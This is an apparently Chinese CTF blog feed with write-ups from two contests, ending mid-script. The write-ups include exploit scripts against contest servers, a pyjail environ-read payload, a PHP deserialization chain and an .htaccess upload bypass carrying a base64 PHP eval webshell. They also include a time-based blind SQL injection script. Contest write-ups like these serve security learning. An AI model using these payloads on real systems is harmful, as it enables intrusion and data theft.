{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY • All posts by \"比赛\" category",
    "description": "承蒙的是希望 做出你想做的",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/",
            "url": "https://lookhui.github.io/%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/",
            "title": "第七届强网杯wp",
            "date_published": "2023-12-17T08:08:10.000Z",
            "content_html": "<h1 id=\"第七届强网杯全国网络安全挑战赛\"><a class=\"anchor\" href=\"#第七届强网杯全国网络安全挑战赛\">#</a> 第七届 &quot;强网杯&quot; 全国网络安全挑战赛</h1>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> misc</h2>\n<h3 id=\"easyfuzz\"><a class=\"anchor\" href=\"#easyfuzz\">#</a> easyfuzz</h3>\n<p>通过 nc 连接的</p>\n<p>满足为全部都是 1 后就能得到 flag</p>\n<p>首先一个一个试拿 0 试然后到 Z 可以试出必须为 9 位并且前面两位是什么都行</p>\n<p>exp</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&quot;101.200.122.251&quot;,12199)</span><br><span class=\"line\">bb=9</span><br><span class=\"line\">cc=&quot;&quot;</span><br><span class=\"line\">vv=111111001</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">for j in range(32,128):</span><br><span class=\"line\">                print(&quot;\\n&quot;)</span><br><span class=\"line\">                p.recvuntil(&quot;bytes):&quot;)</span><br><span class=\"line\">                b=chr(j)+chr(j)+&#x27;qwbG&#x27;+chr(j)+chr(j)+&#x27;d&#x27;</span><br><span class=\"line\">                print(b)</span><br><span class=\"line\">                p.sendline(b)</span><br><span class=\"line\">                c=p.recvuntil(&quot;\\n&quot;)[-10:]</span><br><span class=\"line\">                print(c)</span><br><span class=\"line\">                print(type(c))</span><br><span class=\"line\">                if vv != int(c):</span><br><span class=\"line\">                        print(f&quot;得到&#123;b&#125;\\n&#123;c&#125;&quot;)</span><br><span class=\"line\">                        break</span><br><span class=\"line\">                    # bb -= 1</span><br><span class=\"line\">                    # cc += str(chr(j))</span><br><span class=\"line\">                    # with open(&#x27;a.txt&#x27;, &#x27;a&#x27;) as f:</span><br><span class=\"line\">                    #     f.write(vv + &#x27;\\n&#x27;)  # 将vv写入文件</span><br><span class=\"line\">                    #     vv = &#x27;11&#x27; + &#x27;0&#x27; * (bb - 2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"pyjail-its-myfilter\"><a class=\"anchor\" href=\"#pyjail-its-myfilter\">#</a> Pyjail ! It's myFILTER !!!</h3>\n<p>打开后 nc 连接使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag藏在变量文件里面 直接open打开就能查看到</span><br><span class=\"line\">&#123;print(open(&quot;/proc/1/environ&quot;).read())&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> WEB</h2>\n<h3 id=\"happygame没有出\"><a class=\"anchor\" href=\"#happygame没有出\">#</a> happygame（没有出）</h3>\n<p>web 题我看了很久，硬是搞不懂他这个怎么 happygame 了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">���11</span><br><span class=\"line\">\\���HTTP/2 client preface string missing or corrupt. Hex dump for received bytes: 31310a</span><br></pre></td></tr></table></figure></p>\n<p>怎么看也不像 http 呀我还用 nmap 的 - sV 扫了一下</p>\n<p>还是不行</p>\n<p>可以得到的点就是这个输入什么能输出 hex 编码后的结果并且后面还有一个 0a</p>\n<p>输出超过 24 就不会显示 0a 了</p>\n<p>并且前面的输出位数也能得到信息不同位数会发生变化得到的信息是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Z\\^`bdfhjlnprtvxz|~80 82 84 86</span><br></pre></td></tr></table></figure></p>\n<p>到了 86 后就不会在增加了</p>\n<p>转为 hex 可以知道</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5a 5c 5e 60 62 64 66 68 6a 6c 6e 70 72 74 76 78 7a 7c 7e</span><br></pre></td></tr></table></figure></p>\n<p>每经过一位相当于增加了 2</p>\n<p>还用 ciphey 跑出来了这个</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">KEYS[] mgauoicwqkey</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"guess-game\"><a class=\"anchor\" href=\"#guess-game\">#</a> guess game</h3>\n<p>这种游戏题最好玩了直接通过随机多次能够出 flag</p>\n<p>exp</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class=\"line\">from os import urandom</span><br><span class=\"line\">from binascii import unhexlify</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">class cipher:</span><br><span class=\"line\">    def __init__(self, key, rounds=4):</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\">        self.rounds = rounds</span><br><span class=\"line\">        self.sbox = [0xc, 0x5, 0x6, 0xb, 0x9, 0x0, 0xa, 0xd, 0x3, 0xe, 0xf, 0x8, 0x4, 0x7, 0x1, 0x2]</span><br><span class=\"line\">        self.pbox = [0, 16, 32, 48, 1, 17, 33, 49, 2, 18, 34, 50, 3, 19, 35, 51, 4, 20, 36, 52, 5, 21, 37, 53, 6, 22, 38, 54, 7, 23, 39, 55, 8, 24, 40, 56, 9, 25, 41, 57, 10, 26, 42, 58, 11, 27, 43, 59, 12, 28, 44, 60, 13, 29, 45, 61, 14, 30, 46, 62, 15, 31, 47, 63]</span><br><span class=\"line\">        self.rk = self.genrk(self.key)</span><br><span class=\"line\">    </span><br><span class=\"line\">    def substitution(self, state):</span><br><span class=\"line\">        output = 0</span><br><span class=\"line\">        for i in range(16):</span><br><span class=\"line\">            output += self.sbox[state &gt;&gt; (i*4) &amp; 0xF] &lt;&lt; (i*4)</span><br><span class=\"line\">        return output</span><br><span class=\"line\">    </span><br><span class=\"line\">    def permutation(self, state):</span><br><span class=\"line\">        output = 0</span><br><span class=\"line\">        for i in range(64):</span><br><span class=\"line\">            output += ((state &gt;&gt; i) &amp; 0x1) &lt;&lt; self.pbox[i]</span><br><span class=\"line\">        return output</span><br><span class=\"line\">    </span><br><span class=\"line\">    def genrk(self, key):</span><br><span class=\"line\">        rk = []</span><br><span class=\"line\">        for i in range(1, self.rounds+1):</span><br><span class=\"line\">            rk.append(key &gt;&gt; 16)</span><br><span class=\"line\">            key = ((key &amp; (2**19-1)) &lt;&lt; 61) + (key &gt;&gt; 19)</span><br><span class=\"line\">            key = (self.sbox[key &gt;&gt; 76] &lt;&lt; 76)+(key &amp; (2**76-1))</span><br><span class=\"line\">            key ^= i &lt;&lt; 15</span><br><span class=\"line\">        return rk</span><br><span class=\"line\">    </span><br><span class=\"line\">    def addrk(self, state, rk):</span><br><span class=\"line\">        return state ^ rk</span><br><span class=\"line\">    </span><br><span class=\"line\">    def encrypt(self, pt):</span><br><span class=\"line\">        ct = b&quot;&quot;</span><br><span class=\"line\">        state = pt</span><br><span class=\"line\">        for i in range(self.rounds-1):</span><br><span class=\"line\">            state = self.addrk(state, self.rk[i])</span><br><span class=\"line\">            state = self.substitution(state)</span><br><span class=\"line\">            state = self.permutation(state)</span><br><span class=\"line\">        state = self.addrk(state, self.rk[-1])</span><br><span class=\"line\">        ct += long_to_bytes(state)</span><br><span class=\"line\">        return ct</span><br><span class=\"line\"></span><br><span class=\"line\">    def hint(self, pt):</span><br><span class=\"line\">        return self.encrypt(pt)</span><br><span class=\"line\"></span><br><span class=\"line\">count = 0</span><br><span class=\"line\">success = 0</span><br><span class=\"line\">key = int.from_bytes(urandom(10), &quot;big&quot;) </span><br><span class=\"line\">guess = list(map(int, list(bin(key)[2:].zfill(80))))</span><br><span class=\"line\">game = cipher(key)</span><br><span class=\"line\">ll=0</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    p=remote(&quot;47.97.69.130&quot;,22333)</span><br><span class=\"line\">    f=open(&quot;曲线25.txt&quot;,&quot;a&quot;)</span><br><span class=\"line\">    cc=0</span><br><span class=\"line\">    dd=0</span><br><span class=\"line\">    ll+=1</span><br><span class=\"line\">    p.recvuntil(b&quot;oken:&quot;)</span><br><span class=\"line\">    p.sendline(b&quot;icqc0ccfef5755b58ad320ede21cfa79&quot;)</span><br><span class=\"line\">    p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">    p.sendline(b&quot;2&quot;)</span><br><span class=\"line\">    for i in range(len(guess)):</span><br><span class=\"line\">        p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">        p.sendline(str(guess[i]))</span><br><span class=\"line\">        gg=p.recvline()\t</span><br><span class=\"line\">        if &quot;Right!&quot; in str(gg): </span><br><span class=\"line\">            cc+=1</span><br><span class=\"line\">        if &quot;Wrong&quot; in str(gg):</span><br><span class=\"line\">             dd+=1</span><br><span class=\"line\">    if cc&gt;57:</span><br><span class=\"line\">            print(gg)</span><br><span class=\"line\">            print(f&quot;成功了&#123;cc&#125;次&quot;)</span><br><span class=\"line\">            break</span><br><span class=\"line\">    print(gg)</span><br><span class=\"line\">    print(f&quot;成功了&#123;cc&#125;次&quot;)</span><br><span class=\"line\">    print(f&quot;错误了&#123;dd&#125;次&quot;)</span><br><span class=\"line\">    f.write(f&quot;第&#123;ll&#125;把，成功了&#123;cc&#125;次&quot;)</span><br><span class=\"line\">    f.write(f&quot;失败了&#123;dd&#125;次\\n&quot;)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"强网先锋\"><a class=\"anchor\" href=\"#强网先锋\">#</a> 强网先锋</h2>\n<h3 id=\"speedup\"><a class=\"anchor\" href=\"#speedup\">#</a> SpeedUp</h3>\n<p>通过计算跑出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SpeedUp</span><br><span class=\"line\"></span><br><span class=\"line\">找到2的27次方</span><br><span class=\"line\">4495662081 去md5加密成sha256 flag&#123;加密后的&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "https://lookhui.github.io/%E5%8F%A4%E5%89%91%E5%B1%B1wp-md/",
            "url": "https://lookhui.github.io/%E5%8F%A4%E5%89%91%E5%B1%B1wp-md/",
            "title": "第一届古剑山",
            "date_published": "2023-12-13T05:13:01.000Z",
            "content_html": "<h4 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> WEB</h4>\n<h6 id=\"unset\"><a class=\"anchor\" href=\"#unset\">#</a> unset</h6>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"string\">&quot;./test.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fun&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">justafun</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fun&#x27;</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fun&#x27;</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;yourcode&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>使用 php 伪协议得到 test 源码</p>\n<p><img data-src=\"/pic/image-20231208120950833.png\" alt=\"\" /></p>\n<p>base64 解码后的得到源码</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">    <span class=\"variable\">$test</span> = <span class=\"string\">&quot;Hello world&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">justafun</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|zlib|string/i&quot;</span>, <span class=\"variable\">$filename</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$result</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">FALSE</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">TRUE</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">afun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span>; </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123; </span><br><span class=\"line\">        <span class=\"variable\">$temp</span> = <span class=\"variable language_\">$this</span>-&gt;a . <span class=\"string\">&#x27;ctf&#x27;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">bfun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$items</span> = <span class=\"keyword\">array</span>(); </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">        <span class=\"variable\">$item</span> = <span class=\"variable language_\">$this</span>-&gt;items; </span><br><span class=\"line\">        <span class=\"variable\">$str</span> = <span class=\"variable\">$item</span>[<span class=\"string\">&#x27;dd&#x27;</span>]-&gt;knife; </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;what the good?&#x27;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">cfun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$params</span> = <span class=\"keyword\">array</span>(); </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$key</span></span>) </span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"variable\">$tmp</span> = <span class=\"variable language_\">$this</span>-&gt;params[<span class=\"variable\">$key</span>];</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">var_dump</span>(<span class=\"variable\">$$tmp</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>过滤了 flag 但是 cfun 调用后可以得到 flag</p>\n<p>利用点在 $$tmp</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">afun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">bfun</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">bfun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$items</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;items[<span class=\"string\">&#x27;dd&#x27;</span>]=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">cfun</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">cfun</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$params</span>=<span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;params[<span class=\"string\">&#x27;knife&#x27;</span>]=<span class=\"string\">&#x27;flag&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">afun</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>这样就得到 flag</p>\n<h6 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传</h6>\n<p>第一次做这个题目考点是利用了.htaccess 解析进行了解密，首先使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./wenda.jpg&quot;</span><br><span class=\"line\">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></p>\n<p>使用了 php 的伪协议进行了解密，然后 jpg 只要能上传被加密的图片马内容即可</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"盲人摸象\"><a class=\"anchor\" href=\"#盲人摸象\">#</a> 盲人摸象</h6>\n<p>insert into 注入</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 基于时间的盲注，过滤了逗号 ,</span></span><br><span class=\"line\">sql = <span class=\"string\">&quot;127.0.0.1&#x27;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27; then sleep(5) else 0 end))-- +&quot;</span></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://47.106.186.166:31590/&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">40</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;正在猜测：&#x27;</span>, <span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>, <span class=\"number\">129</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ch == <span class=\"number\">128</span>:</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">        sqli = sql.<span class=\"built_in\">format</span>(i, <span class=\"built_in\">chr</span>(ch))</span><br><span class=\"line\">        <span class=\"comment\"># print(sqli)</span></span><br><span class=\"line\">        header = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>: sqli</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            html = requests.get(url, headers=header, timeout=<span class=\"number\">3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            flag += <span class=\"built_in\">chr</span>(ch)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> pwn</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&quot;amd64&quot;</span>,os=<span class=\"string\">&quot;linux&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p=remote(<span class=\"string\">&quot;0.0.0.0&quot;</span>,<span class=\"number\">8888</span>)</span><br><span 